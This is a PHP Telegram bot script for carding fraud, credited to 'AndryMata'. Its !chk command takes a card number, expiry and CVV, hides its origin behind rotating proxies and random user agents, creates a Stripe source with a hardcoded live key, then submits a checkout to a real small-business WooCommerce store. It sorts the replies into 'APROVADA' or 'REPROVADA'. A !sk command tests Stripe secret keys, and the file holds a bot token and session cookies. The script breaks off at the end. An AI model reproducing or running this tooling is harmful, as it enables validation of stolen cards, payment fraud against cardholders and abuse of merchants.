<?php

////////////////=============[Made with ❤️ by AndryMata]===============////////////////

///https://api.telegram.org/bot<https://api.telegram.org/bot2026063151:AAHtO69Y3YClBDf0EW_O-4Vl2FIKCUeVV6I/setwebhook?url=<url>>/setwebhook?url=<url>



$botToken = "2026063151:AAHtO69Y3YClBDf0EW_O-4Vl2FIKCUeVV6I"; // Enter ur bot token
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];

//////////=========[Start Command]=========//////////

if ((strpos($message, "!start") === 0)||(strpos($message, "/start") === 0)){
sendMessage($chatId, "<b>Hello there!!%0AType /cmds to know all my commands!!%0A%0ABot Made by: Andry Mata</b>");
}

//////////=========[Cmds Command]=========//////////

elseif ((strpos($message, "!cmds") === 0)||(strpos($message, "/cmds") === 0)){
sendMessage($chatId, "<u>Bin lookup:</u> <code>!bin</code> xxxxxx%0A<u>SK Key Check:</u> <code>!sk</code> sk_live%0A<u>Stripe:</u> <code>!chk</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Info:</u> <code>/info</code> To know ur info%0A%0A<b>Bot Made by: Andry Mata</b>");
}

//////////=========[Info Command]=========//////////

elseif ((strpos($message, "!info") === 0)||(strpos($message, "/info") === 0)){
sendMessage($chatId, "<u>ID:</u> <code>$userId</code>%0A<u>First Name:</u> $firstname%0A<u>Username:</u> @$username%0A%0A<b>Bot Made by: Andry Mata </b>");
}

//////////=========[Bin Command]=========//////////

elseif ((strpos($message, "!bin") === 0)||(strpos($message, "/bin") === 0)){
$bin = substr($message, 5);
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
//$name = $fim['country']['alpha2']; ////country abbreviated example (US)
//$name = $fim['country']['name']; //// country
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
///$test2 = GetStr($fim, '"alpha2":"', '"'); ////country abbreviated example (US)
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}
curl_close($ch);

 
curl_close($ch);
sendMessage($chatId, '<b>✅ Valid Bin</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.''.$emoji.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Currency:</b> '.$currency.'%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot Made by: Andry Mata </b>');
}
curl_close($ch);

//////////////////////////===========RANDOM USER AGENT=============///////////////////////////////////
function random_ua() {
    $tiposDisponiveis = array("Chrome", "Firefox", "Opera", "Explorer");
    $tipoNavegador = $tiposDisponiveis[array_rand($tiposDisponiveis)];
    switch ($tipoNavegador) {
        case 'Chrome':
            $navegadoresChrome = array("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36',
            );
            return $navegadoresChrome[array_rand($navegadoresChrome)];
            break;
        case 'Firefox':
            $navegadoresFirefox = array("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
                'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0',
                'Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
                'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0',
                'Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0',
                'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0',
            );
            return $navegadoresFirefox[array_rand($navegadoresFirefox)];
            break;
        case 'Opera':
            $navegadoresOpera = array("Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
                'Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16',
                'Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14',
                'Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02',
                'Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00',
                'Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00',
                'Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00',
                'Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00',
                'Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0',
            );
            return $navegadoresOpera[array_rand($navegadoresOpera)];
            break;
        case 'Explorer':
            $navegadoresOpera = array("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
                'Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)',
                'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)',
            );
            return $navegadoresOpera[array_rand($navegadoresOpera)];
            break;
    }
}
$ua = random_ua();


//////////////////////////===========RANDOM USER AGENT=============///////////////////////////////////

//////////=========[Chk Command]=========//////////

if ((strpos($message, "!chk") === 0)||(strpos($message, "/chk") === 0)){
$lista = substr($message, 5);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$ano1 = substr($yyyy, 2, 4);
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}

curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

////////////////////////////===[Randomizing Details 

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[Proxys]===//////////////

$rp1 = array(
  1 => 'user-rotate:pass',
  2 => 'user-rotate:pass',
  3 => 'user-rotate:pass',
  4 => 'user-rotate:pass',
  5 => 'user-rotate:pass',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];


$ip = array(
  1 => 'socks5://p.webshare.io:1080',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];

////////////////////////////////////////////

////////////////////////////==============[Proxy Section]===============//////////////////////////////

$url = "https://api.ipify.org/";   

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();   
if (isset($ip1)){
$ip = "Proxy live";
}
if (empty($ip1)){
$ip = "Proxy Dead:[".$rotate."]";
}

//echo '[ IP: '.$ip.' ] ';

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

///////////////=[1st REQ]=/////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'accept: application/json',
'accept-encoding: gzip, deflate, br',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: '.$ua.'',
   ));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=jaja+ka&owner[address][line1]=+4352+Boulevard+Lafl%C3%A8che&owner[address][state]=QC&owner[address][city]=Riviere+Du+Loup&owner[address][postal_code]=G5R+1R7&owner[address][country]=CA&owner[email]=Je'.$ano.'jeka%40gmail.com&owner[phone]=4182926565&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=ed0435dd-9a7f-45f8-8d18-e5860a51cdeed30945&muid=1b30c9f4-5cf3-42b7-bd28-17099255e55c20f276&sid=3317e312-0c8b-4a64-ae67-2d59521aaa4cd9eaa4&pasted_fields=number&payment_user_agent=stripe.js%2F673cc8e85%3B+stripe-js-v3%2F673cc8e85&time_on_page=333972&key=pk_live_51IYfKPF6Fwrk47fkHbuFeP3U5bSMZfqF1EUFhweQRclLU59EiPKQVlP6I7mtsKS9orJ5jiT9Q9Z3XWPpd0ojf7iv007HqU7hRt');

 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 curl_close($ch);

//////////////=[2nd Req]=//////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://pasitheabodyandsoul.ca/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: pasitheabodyandsoul.ca',
'accept: application/json, text/javascript, */*; q=0.01',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: _ga=GA1.1.2145432066.1635674069; tk_or=%22https%3A%2F%2Fwww.google.com%2F%22; tk_r3d=%22https%3A%2F%2Fwww.google.com%2F%22; tk_lr=%22https%3A%2F%2Fwww.google.com%2F%22; _fbp=fb.1.1635674078792.1066178940; wp_woocommerce_session_8f473a23d1259b94cebaf7bbae975d10=7ecc162c9171e593d84b13979ffd996c%7C%7C1635846888%7C%7C1635843288%7C%7C869b47df0c117926ffb76cfacfcf66e8; tk_ai=CO0I4NfBLjLDpSEBB3W74Z%2Bl; woocommerce_items_in_cart=1; _ga_JCGJ3E3DKW=GS1.1.1635674068.1.1.1635674104.0; tk_qs=; __stripe_mid=1b30c9f4-5cf3-42b7-bd28-17099255e55c20f276; __stripe_sid=3317e312-0c8b-4a64-ae67-2d59521aaa4cd9eaa4; woocommerce_cart_hash=6b026538d2e9a04b43ae39fad22e09d8',
'origin: https://pasitheabodyandsoul.ca',
'referer: https://pasitheabodyandsoul.ca/checkout/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: '.$ua.'',
'x-requested-with: XMLHttpRequest',

   ));
curl_setopt($ch, CURLOPT_POSTFIELDS,'billing_first_name=jaja&billing_last_name=ka&billing_company=&billing_country=CA&billing_address_1=+4352+Boulevard+Lafl%C3%A8che&billing_address_2=&billing_city=Riviere+Du+Loup&billing_state=QC&billing_postcode=G5R+1R7&billing_phone=4182926565&billing_email=Je'.$ano.'jeka%40gmail.com&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=CA&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=ON&shipping_postcode=&shipping_phone=&order_comments=&shipping_method%5B0%5D=flat_rate%3A5&payment_method=stripe&terms=on&terms-field=1&woocommerce-process-checkout-nonce=263116f0a9&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&stripe_source='.$id.'');
  $result2 = curl_exec($ch);
$cvc_check = trim(strip_tags(getStr($result2,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\t','\t\t')));
 $info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
curl_close($ch);

//////////////////////////////////////////////////////////////////////////////////////////////////////////////

 if ((strpos($result2, 'incorrect_zip')) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, 'The zip code you supplied failed validation.'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ CVV MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
}
elseif ((strpos($result2, '"cvc_check":"pass"')) || (strpos($result2, "Thank You.")) || (strpos($result2, '"status": "succeeded"')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "Your payment has already been processed")) || (strpos($result2, "Success ")) || (strpos($result2, '"type":"one-time"')) || (strpos($result2, "/donations/thank_you?donation_number="))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ CVV MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
}
elseif ((strpos($result2, 'Your card has insufficient funds.')) || (strpos($result2, 'insufficient_funds'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b> 『 ★ CCN LIVE ★ 』 『 ★ Insufficient Funds ★ 』 </b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
}
elseif ((strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc")) || (strpos($result2, "The card's security code is incorrect."))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ CCN MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
}
elseif ((strpos($result2, "Your card does not support this type of purchase.")) || (strpos($result2, "transaction_not_allowed"))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b> 『 ★ CCN MATCHED ★ 』 『 ★ Card Doesnt Support Purchase ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
}
elseif ((strpos($result2, "pickup_card")) || (strpos($result2, "lost_card")) || (strpos($result2, "stolen_card"))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Pickup Card 「Reported Stolen Or Lost」 ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
}
elseif (strpos($result2, "do_not_honor")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Do_Not_Honor ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
}
elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'incorrect_number'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Incorrect Card Number ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
}
elseif ((strpos($result2, 'Your card has expired.')) || (strpos($result2, 'expired_card'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Expired Card ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
}
elseif (strpos($result2, "generic_decline")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
}
elseif (strpos($result1, "generic_decline")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
}
elseif ((strpos($result2, '"cvc_check":"unavailable"')) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, '"cvc_check": "fail"'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Security Code Check : '.$cvc_check.' [Proxy Dead/change IP] ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
}
elseif ((strpos($result2, "Your card was declined.")) || (strpos($result2, 'The card was declined.'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Card Declined ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
}
elseif(!$result2){
sendMessage($chatId, ''.$result2.'');
}else{
sendMessage($chatId, ''.$result2.'');
}
curl_close($ch);
}


//////////=========[Sk Key Check Command]=========//////////

elseif ((strpos($message, "!sk") === 0)||(strpos($message, "/sk") === 0)){
$sec = substr($message, 4);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5154620061414478&card[exp_month]=01&card[exp_year]=2023&card[cvc]=235");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (strpos($result, 'api_key_expired')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> EXPIRED KEY%0A%0A<b>Bot Made by: Andry Mata </b>");
}
elseif (strpos($result, 'Invalid API Key provided')){
